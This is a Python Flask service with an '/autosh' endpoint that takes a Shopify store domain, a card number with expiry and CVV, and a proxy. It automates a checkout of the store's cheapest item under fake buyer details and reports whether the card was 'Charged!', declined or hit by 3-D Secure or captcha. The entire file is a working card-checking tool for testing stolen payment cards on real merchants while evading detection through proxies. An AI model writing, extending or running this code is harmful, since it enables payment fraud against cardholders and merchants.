from flask import Flask, request, jsonify
import aiohttp
import asyncio
import random
import re
from urllib.parse import urlparse
import json

app = Flask(__name__)

# Mock Utils class since we don't have the original
class Utils:
    @staticmethod
    def get_random_name():
        return "John", "Doe"
    
    @staticmethod
    def generate_email(first_name, last_name):
        return f"{first_name}.{last_name}@example.com"
    
    @staticmethod
    def get_formatted_address():
        return {
            'phone': '+1234567890',
            'street': '123 Main St',
            'city': 'New York',
            'state': 'NY',
            'zip': '10001'
        }

def extract_between(text, start, end):
    try:
        return text.split(start)[1].split(end)[0]
    except:
        return None

async def fetchProducts(proxy, domain):
    try:
        domain = "https://" + domain
        async with aiohttp.ClientSession(proxy=proxy) as session:
            async with session.get(f"{domain}/products.json", timeout=10) as resp:
                if resp.status != 200:
                    return False, "<b>Site Error!</b>"
                text = await resp.text()
                if "shopify" not in text.lower():
                    return False, "<b>Not Shopify!</b>"

                result = (await resp.json())['products']
                if not result:
                    return False, "<b>No Products!</b>"

        min_price = float('inf')
        min_product = None

        for product in result:
            if not product.get('variants'):
                continue
            
            # Check product level price
            if product.get('available') and product.get('variants'):
                variant = product['variants'][0]
                price = variant.get('price', '0')
                if isinstance(price, str):
                    price = float(price.replace(',', ''))
                else:
                    price = float(price)
                if price < min_price:
                    min_price = price
                    min_product = {
                        'site': domain,
                        'price': f"{price:.2f}",
                        'variant_id': str(variant['id']),
                        'link': f"{domain}/products/{product['handle']}"
                    }

            # Check variant prices
            for variant in product['variants']:
                if not variant.get('available', True):
                    continue

                try:
                    price = variant.get('price', '0')
                    if isinstance(price, str):
                        price = float(price.replace(',', ''))
                    else:
                        price = float(price)

                    if price < min_price:
                        min_price = price
                        min_product = {
                            'site': domain,
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'link': f"{domain}/products/{product['handle']}"
                        }

                except (ValueError, TypeError, AttributeError):
                    continue
        
        print(min_product)
        if min_product and isinstance(min_product, dict) and min_product.get('price'):
            return min_product
        else:
            return False, "<b>No Valid Products</b>"

    except aiohttp.ClientError:
        return False, "<b>Proxy Error!</b>"
    except Exception as e:
        return False, f"error: {str(e)}"

async def process_card(cc, mes, ano, cvv, site=None, proxy=None):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
            'Pragma': 'no-cache',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.8'
        }

        proxy_str = None
        if proxy:
            proxy_str = f"http://{proxy}"
            print(f"Using proxy: {proxy_str}")

        ourl = 'https://' + str(site)
        print(f"Target URL: {ourl}")

        # Generate fake user info
        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)
        data = Utils.get_formatted_address()

        phone = data['phone']
        street = data['street']
        city = data['city']
        state = data['state']
        country = 'US'
        s_zip = data['zip']
        address2 = Utils.get_formatted_address()['street']
        
        # Fetch product info to get variant_id
        product_info = await fetchProducts(proxy_str, site)
        if isinstance(product_info, tuple) and not product_info[0]:
            return False, product_info[1]
        
        variant_id = product_info.get('variant_id') if isinstance(product_info, dict) else None
        
        if not variant_id:
            return False, "Could not find valid product variant"

        async with aiohttp.ClientSession(proxy=proxy_str) as session:
            url = ourl

            # Add to cart
            cart = url + '/cart/add.js'
            checkout = url + '/checkout/'

            await session.post(cart, data={'id': variant_id}, headers=headers)

            # Go to checkout
            response = await session.post(url=checkout)
            checkout_url = str(response.url)
            
            if 'login' in checkout_url.lower():
                return False, "Site requires login!"
            
            resp = await session.get(checkout_url)
            text = await resp.text()
            
            # Extract session tokens
            sst = extract_between(text, 'name="serialized-session-token" content="&quot;', '&q')
            if not sst:
                resp = await session.get(checkout_url)
                text = await resp.text()
                sst = extract_between(text, 'name="serialized-session-token" content="&quot;', '&q')

            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&q')
            stableId = extract_between(text, 'stableId&quot;:&quot;', '&q')
            merch = extract_between(text, 'ProductVariantMerchandise/', '&q')
            
            subtotal = extract_between(text, 'totalAmount&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&q')
            if not subtotal:
                subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&q')
            
            if not sst:
                return False, "Failed to get token"

            # Extract currency
            pattern = r'currencycode\s*[:=]\s*["\']?([^"\']+)["\']?'
            currency = re.search(pattern, text.lower())
            if currency is not None:
                currency = currency.group(1)
            if not currency:
                currency = extract_between(text, 'urrencyCode&quot;:&quot;', '&q') or 'USD'

            # First proposal request for shipping
            params = {'operationName': 'Proposal'}
            json_data = {
                'query': 'query Proposal($sessionInput: SessionTokenInput!, $queueToken: String, $delivery: DeliveryTermsInput, $merchandise: MerchandiseTermInput, $payment: PaymentTermInput, $buyerIdentity: BuyerIdentityTermInput, $taxes: TaxTermInput) { session(sessionInput: $sessionInput) { negotiate(input: { purchaseProposal: { delivery: $delivery, merchandise: $merchandise, payment: $payment, buyerIdentity: $buyerIdentity, taxes: $taxes }, queueToken: $queueToken }) { result { ... on NegotiationResultAvailable { sellerProposal { delivery { ... on FilledDeliveryTerms { deliveryLines { availableDeliveryStrategies { handle amount { value { amount currencyCode } } } } } runningTotal { value { amount currencyCode } } tax { totalTaxAmount { value { amount } } } payment { availablePaymentLines { paymentMethod { paymentMethodIdentifier name extensibilityDisplayName } } } } } } } } }',
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken,
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': 'US', 'postalCode': s_zip, 'firstName': firstName,
                                    'lastName': lastName, 'zoneCode': state, 'phone': phone
                                }
                            },
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING']
                        }]
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId,
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}'
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {
                                'value': {'amount': subtotal, 'currencyCode': currency}
                            }
                        }]
                    },
                    'payment': {'totalAmount': {'any': True}},
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': 'US'},
                        'email': email,
                        'marketingConsent': [{'email': {'value': email}}]
                    },
                    'taxes': {
                        'proposedTotalAmount': {
                            'value': {'amount': '0', 'currencyCode': currency}
                        }
                    }
                }
            }

            response = await session.post(
                f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql',
                params=params, headers=headers, json=json_data
            )

            resp_json = await response.json()
            
            # Extract shipping and payment info
            delivery_data = resp_json['data']['session']['negotiate']['result']['sellerProposal']['delivery']
            running_total = resp_json['data']['session']['negotiate']['result']['sellerProposal']['runningTotal']['value']['amount']

            if delivery_data['__typename'] == 'PendingTerms':
                delivery_strategy = ''
                shipping_amount = 0.0
            else:
                available_strategies = delivery_data.get('deliveryLines', [{}])[0].get('availableDeliveryStrategies', [])
                if available_strategies:
                    delivery_strategy = available_strategies[0]['handle']
                    shipping_amount = available_strategies[0]['amount']['value']['amount']
                else:
                    delivery_strategy = ''
                    shipping_amount = 0.0

            try:
                tax_amount = resp_json['data']['session']['negotiate']['result']['sellerProposal']['tax']['totalTaxAmount']['value']['amount']
            except:
                tax_amount = 0.0

            payment_methods = resp_json['data']['session']['negotiate']['result']['sellerProposal']['payment']['availablePaymentLines']
            payment_identifier = None
            payment_name = None
            displayName = None
            
            for method in payment_methods:
                if method['paymentMethod'].get('name'):
                    payment_identifier = method['paymentMethod']['paymentMethodIdentifier']
                    payment_name = method['paymentMethod']['name']
                    displayName = method['paymentMethod'].get('extensibilityDisplayName')
                    break

            # Get payment token
            formattedCard = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
            payload = {
                "credit_card": {
                    "month": mes,
                    "name": f"{firstName} {lastName}",
                    "number": formattedCard,
                    "verification_value": cvv,
                    "year": ano
                },
                "payment_session_scope": f"www.{(urlparse(url)).netloc}"
            }

            response = await session.post('https://deposit.shopifycs.com/sessions', json=payload)
            try:
                token = (await response.json())['id']
            except:
                return False, 'Unable to get payment token'

            # Submit for completion
            params = {'operationName': 'SubmitForCompletion'}
            json_data = {
                'query': 'mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!) { submitForCompletion(input: $input, attemptToken: $attemptToken) { ... on SubmitSuccess { receipt { id } } ... on SubmitFailed { reason } } }',
                'variables': {
                    'input': {
                        'sessionInput': {'sessionToken': sst},
                        'queueToken': queueToken,
                        'delivery': {
                            'deliveryLines': [{
                                'destination': {
                                    'streetAddress': {
                                        'address1': street, 'address2': address2, 'city': city,
                                        'countryCode': 'US', 'postalCode': s_zip, 'firstName': firstName,
                                        'lastName': lastName, 'zoneCode': state, 'phone': phone
                                    }
                                },
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyByHandle': {
                                        'handle': delivery_strategy,
                                        'customDeliveryRate': False
                                    }
                                },
                                'targetMerchandiseLines': {'lines': [{'stableId': stableId}]},
                                'deliveryMethodTypes': ['SHIPPING']
                            }]
                        },
                        'merchandise': {
                            'merchandiseLines': [{
                                'stableId': stableId,
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                        'variantId': f'gid://shopify/ProductVariant/{variant_id}'
                                    }
                                },
                                'quantity': {'items': {'value': 1}}
                            }]
                        },
                        'payment': {
                            'paymentLines': [{
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'paymentMethodIdentifier': payment_identifier,
                                        'sessionId': token,
                                        'billingAddress': {
                                            'streetAddress': {
                                                'address1': street, 'address2': address2, 'city': city,
                                                'countryCode': 'US', 'postalCode': s_zip, 'firstName': firstName,
                                                'lastName': lastName, 'zoneCode': state, 'phone': phone
                                            }
                                        }
                                    }
                                },
                                'amount': {
                                    'value': {
                                        'amount': running_total,
                                        'currencyCode': currency
                                    }
                                }
                            }]
                        },
                        'buyerIdentity': {
                            'customer': {'presentmentCurrency': currency, 'countryCode': 'US'},
                            'email': email
                        }
                    },
                    'attemptToken': checkout_url.split('/')[-1]
                }
            }

            response = await session.post(
                f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql',
                params=params, headers=headers, json=json_data
            )
            
            text = await response.text()
            
            if "Your order total has changed." in text:
                return False, "Site not supported for now!"
            if "The requested payment method is not available." in text:
                return False, "Payment method is not shopify!"

            try:
                result = await response.json()
                if 'data' in result and 'submitForCompletion' in result['data']:
                    if 'receipt' in result['data']['submitForCompletion']:
                        return True, f"Charged! - {running_total} {currency}", displayName, running_total, currency
                    elif 'reason' in result['data']['submitForCompletion']:
                        return False, result['data']['submitForCompletion']['reason']
            except:
                pass

            if 'CAPTCHA_METADATA_MISSING' in text:
                return False, "Captcha at Checkout - Use good proxies!"
            elif 'PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE' in text:
                return False, "Invalid Card"
            elif 'actionreq' in text.lower():
                return False, "3D - Action Required"
            
            return False, "Unknown error occurred"

    except Exception as e:
        print(f'Error processing card: {str(e)}')
        return False, f"Error Processing Card: {str(e)}"

@app.route('/autosh', methods=['GET'])
async def autosh_endpoint():
    site = request.args.get('site')
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')
    
    if not site or not cc:
        return jsonify({'error': 'Missing required parameters: site and cc'}), 400
    
    # Parse CC details (format: number|month|year|cvv)
    cc_parts = cc.split('|')
    if len(cc_parts) != 4:
        return jsonify({'error': 'Invalid CC format. Use: number|month|year|cvv'}), 400
    
    cc_number, month, year, cvv = cc_parts
    
    try:
        # Run the async function
        result = await process_card(cc_number, month, year, cvv, site, proxy)
        
        if result[0]:  # Success
            return jsonify({
                'status': 'success',
                'message': result[1],
                'gateway': result[2] if len(result) > 2 else 'Unknown',
                'amount': result[3] if len(result) > 3 else 'Unknown',
                'currency': result[4] if len(result) > 4 else 'USD'
            })
        else:  # Failed
            return jsonify({
                'status': 'failed',
                'message': result[1]
            })
            
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Internal server error: {str(e)}'
        }), 500

# Helper to run async functions in Flask
@app.before_request
def before_request():
    if request.endpoint in ['autosh_endpoint']:
        pass

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
